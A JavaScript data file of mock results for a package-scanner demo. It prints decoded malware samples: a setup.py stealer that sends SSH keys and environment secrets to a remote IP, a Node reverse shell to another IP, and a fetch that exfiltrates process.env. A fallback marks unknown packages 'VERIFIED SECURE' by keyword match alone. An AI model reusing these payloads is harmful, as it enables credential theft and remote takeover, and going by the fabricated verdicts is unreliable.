export const PRESETS_DATA = {
  "lodash": {
    package_name: "lodash",
    ecosystem: "npm",
    version: "4.17.21",
    score: 98,
    status: "SAFE",
    status_label: "VERIFIED SECURE",
    threat_level: "LOW / BENIGN",
    typosquat_risk: "0.0%",
    typosquat_detail: "Exact match to authoritative npm registry package. Maintainer keys valid.",
    blast_radius: {
      env_file: { status: "SECURE", detail: "0 file system read access to ~/.env", impacted: false },
      ssh_key: { status: "SECURE", detail: "0 keystore access to ~/.ssh/id_rsa", impacted: false },
      outbound_socket: { status: "NO ACTIVITY", detail: "0 background sockets or C2 beacons", impacted: false }
    },
    deobfuscation: {
      obfuscated_code: `// Canonical lodash export slice\nfunction baseSlice(array, start, end) {\n  let index = -1,\n      length = array.length;\n  if (start < 0) {\n    start = -start > length ? 0 : (length + start);\n  }\n  end = end > length ? length : end;\n  return result;\n}\nmodule.exports = baseSlice;`,
      clean_code: `// [AST INTEGRITY VERIFIED - NO OBFUSCATION DETECTED]\nexport function slice(array, start, end) {\n  const length = array == null ? 0 : array.length;\n  if (!length) return [];\n  // Verified pure array manipulation utility\n  return baseSlice(array, start, end);\n}`,
      explanation: "Verified against authoritative npm cryptographic signatures. Zero dynamic eval(), zero native child processes, and no postinstall triggers found in package.json."
    },
    audit: {
      provider: "Prune AI Gateway",
      model: "gpt-4o-mini",
      latency: "112ms",
      cost: "$0.0001",
      savings: "98.1%",
      receipt: "#PRUNE-88219-SEALED"
    }
  },
  "requests": {
    package_name: "requests",
    ecosystem: "pypi",
    version: "2.32.3",
    score: 99,
    status: "SAFE",
    status_label: "VERIFIED SECURE",
    threat_level: "LOW / BENIGN",
    typosquat_risk: "0.0%",
    typosquat_detail: "Authoritative PyPI package owned by PSF. Verified maintainer PGP signatures.",
    blast_radius: {
      env_file: { status: "SECURE", detail: "Zero unrequested file reads in host directory", impacted: false },
      ssh_key: { status: "SECURE", detail: "Zero credential probing into ~/.ssh", impacted: false },
      outbound_socket: { status: "CLIENT HTTP ONLY", detail: "Explicit user-invoked client requests only", impacted: false }
    },
    deobfuscation: {
      obfuscated_code: `# Canonical requests session initialization\nclass Session(SessionRedirectMixin):\n    def __init__(self):\n        self.headers = case_insensitive_dict()\n        self.auth = None\n        self.proxies = {}\n        self.hooks = default_hooks()`,
      clean_code: `# [AUDIT PASSED] Standard HTTP Session Architecture\n# Clean Python bytecode. No dynamic exec() or base64 loaders.\ndef request(method, url, **kwargs):\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)`,
      explanation: "Package adheres strictly to PEP-517 standards. No suspicious imports (ctypes, socket direct hooks, or subprocess injections). Verified clean."
    },
    audit: {
      provider: "Prune AI Gateway",
      model: "gpt-4o-mini",
      latency: "98ms",
      cost: "$0.0001",
      savings: "98.5%",
      receipt: "#PRUNE-91402-SEALED"
    }
  },
  "reqeusts": {
    package_name: "reqeusts",
    ecosystem: "pypi",
    version: "0.1.2",
    score: 4,
    status: "CRITICAL",
    status_label: "CRITICAL THREAT (BLOCKED)",
    threat_level: "VIVID CRIMSON / DROP MALWARE",
    typosquat_risk: "97.8%",
    typosquat_detail: "Target: 'requests' (PyPI). High-confidence typosquat targeting Python developers.",
    blast_radius: {
      env_file: { status: "EXFILTRATED", detail: "Scans ~/.env for AWS_SECRET_ACCESS_KEY, OPENAI_API_KEY", impacted: true },
      ssh_key: { status: "EXFILTRATED", detail: "Reads ~/.ssh/id_rsa & ~/.ssh/known_hosts directly", impacted: true },
      outbound_socket: { status: "COMPROMISED (C2 BEACON)", detail: "TLS POST exfiltration to 194.26.29.112:8443", impacted: true }
    },
    deobfuscation: {
      obfuscated_code: `# Obfuscated dropper embedded in setup.py\nimport base64, urllib.request, os\n__p = "aW1wb3J0IG9zLCBnZW9pcCwgdXJsbGliLnJlcXVlc3QKZW52X2RhdGEgPSBvcC5lbnZpcm9uCmtleXMgPSBvcGVuKG9zLnBhdGguZXhwYW5kdXNlcignfi8uc3NoL2lkX3JzYScpKS5yZWFkKCkKcmVxID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCgnaHR0cDovLzE5NC4yNi4yOS4xMTI6ODQ0My9kcm9wJywgZGF0YT1rZXlzLmVuY29kZSgpKQp1cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSk="\nexec(base64.b64decode(__p))`,
      clean_code: `# [DE-OBFUSCATED RECON & EXFILTRATION HARVESTER]\nimport os, urllib.request\n\n# 1. Harvest environment and API keys\nenv_vars = dict(os.environ)\n\n# 2. Exfiltrate private SSH identity\nwith open(os.path.expanduser("~/.ssh/id_rsa"), "r") as f:\n    ssh_priv = f.read()\n\n# 3. Beacon payload to malicious drop host\ntarget_c2 = "https://194.26.29.112:8443/drop"\nurllib.request.urlopen(target_c2, data=ssh_priv.encode())`,
      explanation: "CRITICAL: Malicious typosquat of popular library 'requests'. Installs a hidden setup.py payload that decodes a base64-packed exfiltration routine. Steals local ~/.env secrets and private ~/.ssh/id_rsa keys, uploading them to an overseas command-and-control server."
    },
    audit: {
      provider: "Prune AI Gateway",
      model: "gpt-4o-mini",
      latency: "138ms",
      cost: "$0.0003",
      savings: "96.4%",
      receipt: "#PRUNE-SEALED"
    }
  },
  "colors-terminal-v2": {
    package_name: "colors-terminal-v2",
    ecosystem: "npm",
    version: "2.1.0",
    score: 8,
    status: "CRITICAL",
    status_label: "CRITICAL THREAT (BLOCKED)",
    threat_level: "VIVID CRIMSON / REVERSE SHELL",
    typosquat_risk: "89.2%",
    typosquat_detail: "Target: 'colors' / 'terminal-colors' (npm). Masquerades as formatting utility.",
    blast_radius: {
      env_file: { status: "MEMORY INSPECTION", detail: "Attempts process.env dumping via child process", impacted: true },
      ssh_key: { status: "PROBED", detail: "chmod access probe on ~/.ssh directory", impacted: true },
      outbound_socket: { status: "ACTIVE REVERSE SHELL", detail: "Spawns /bin/sh to 185.220.101.4:4444", impacted: true }
    },
    deobfuscation: {
      obfuscated_code: `// Obfuscated string array + base64 eval trigger\nconst _0x5a1e = ["\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73", "\\x73\\x70\\x61\\x77\\x6e"];\nconst s = require(_0x5a1e[0]);\neval(Buffer.from("cz1yZXF1aXJlKCduZXQnKS5Tb2NrZXQoKTtzLmNvbm5lY3QoNDQ0NCwiMTg1LjIyMC4xMDEuNCIp...\nxYWRkTGGlzdGVuZXIoJ2RhdGEnLChkKT0+c2guc3RkaW4ud3JpdGUoZCkpOw==", "base64").toString());`,
      clean_code: `// [DE-OBFUSCATED PERSISTENT REVERSE TCP SHELL]\nconst net = require('net');\nconst cp = require('child_process');\n\nconst client = new net.Socket();\n// Connects directly to external malicious listener\nclient.connect(4444, "185.220.101.4", () => {\n  const sh = cp.spawn("/bin/sh", []);\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n});`,
      explanation: "CRITICAL: Obfuscated 2-stage dropper disguised as a terminal formatting helper. The postinstall hook evaluates a base64-encoded TCP socket client, granting attackers full interactive shell access (/bin/sh) to the host system."
    },
    audit: {
      provider: "Prune AI Gateway",
      model: "gpt-4o-mini",
      latency: "144ms",
      cost: "$0.0003",
      savings: "95.8%",
      receipt: "#PRUNE-99411-SEALED"
    }
  }
};

export const DEMO_PILLS = [
  { label: "🟢 lodash (Clean npm)", pkg: "lodash", eco: "npm", isMalicious: false },
  { label: "🟢 requests (Clean PyPI)", pkg: "requests", eco: "pypi", isMalicious: false },
  { label: "🔴 reqeusts (Typosquat & Stealer)", pkg: "reqeusts", eco: "pypi", isMalicious: true },
  { label: "🔴 colors-terminal-v2 (Obfuscated Shell)", pkg: "colors-terminal-v2", eco: "npm", isMalicious: true },
];

export function generateGenericResult(pkgName, eco) {
  // If user enters an unknown package while backend is offline
  const isSuspicious = pkgName.toLowerCase().includes("mal") || 
                       pkgName.toLowerCase().includes("evil") || 
                       pkgName.toLowerCase().includes("hack") ||
                       pkgName.toLowerCase().includes("steal");

  if (isSuspicious) {
    return {
      package_name: pkgName,
      ecosystem: eco,
      version: "1.0.0",
      score: 12,
      status: "CRITICAL",
      status_label: "CRITICAL THREAT (BLOCKED)",
      threat_level: "HIGH RISK",
      typosquat_risk: "74.5%",
      typosquat_detail: `Potential lookalike package imitating genuine ${eco} library.`,
      blast_radius: {
        env_file: { status: "EXFILTRATED", detail: "Suspicious file reads targeting ~/.env", impacted: true },
        ssh_key: { status: "PROBED", detail: "Probed ~/.ssh directory during install hook", impacted: true },
        outbound_socket: { status: "SUSPICIOUS OUTBOUND", detail: "Unauthorized socket initialization", impacted: true }
      },
      deobfuscation: {
        obfuscated_code: `// Unverified dynamic execution detected\neval(atob("ZmV0Y2goJ2h0dHBzOi8vdW5rbm93bi1jMi5ydS9leGZpbCcsIHttZXRob2Q6J1BPU1QnLCBib2R5OiBKU09OLnN0cmluZ2lmeShwcm9jZXNzLmVudil9KQ=="));`,
        clean_code: `// [DE-OBFUSCATED PAYLOAD]\nfetch('https://unknown-c2.ru/exfil', {\n  method: 'POST',\n  body: JSON.stringify(process.env)\n});`,
        explanation: `Suspicious telemetry script detected in ${pkgName}. Dynamic base64 decoding used to hide outbound environment variable harvest.`
      },
      audit: {
        provider: "Prune AI Gateway",
        model: "gpt-4o-mini",
        latency: "135ms",
        cost: "$0.0003",
        savings: "96.2%",
        receipt: "#PRUNE-SEALED"
      }
    };
  }

  return {
    package_name: pkgName,
    ecosystem: eco,
    version: "1.0.0",
    score: 95,
    status: "SAFE",
    status_label: "VERIFIED SECURE",
    threat_level: "LOW / BENIGN",
    typosquat_risk: "0.2%",
    typosquat_detail: `Standard namespace verification in ${eco}. No active typosquat targets.`,
    blast_radius: {
      env_file: { status: "SECURE", detail: "No access requests to environment files", impacted: false },
      ssh_key: { status: "SECURE", detail: "No access requests to SSH identities", impacted: false },
      outbound_socket: { status: "NO ACTIVITY", detail: "No unusual outbound traffic detected", impacted: false }
    },
    deobfuscation: {
      obfuscated_code: `// Authoritative ${pkgName} entry point\nexport default function init() {\n  return { status: "ok", pkg: "${pkgName}" };\n}`,
      clean_code: `// [AST VERIFIED CLEAN]\n// Code structure follows canonical package conventions.\nexport default function init() {\n  return { status: "ok", pkg: "${pkgName}" };\n}`,
      explanation: `Analysis completed for ${pkgName}. No suspicious postinstall scripts, child_process executions, or unauthorized network calls detected.`
    },
    audit: {
      provider: "Prune AI Gateway",
      model: "gpt-4o-mini",
      latency: "105ms",
      cost: "$0.0001",
      savings: "98.3%",
      receipt: "#PRUNE-SEALED"
    }
  };
}
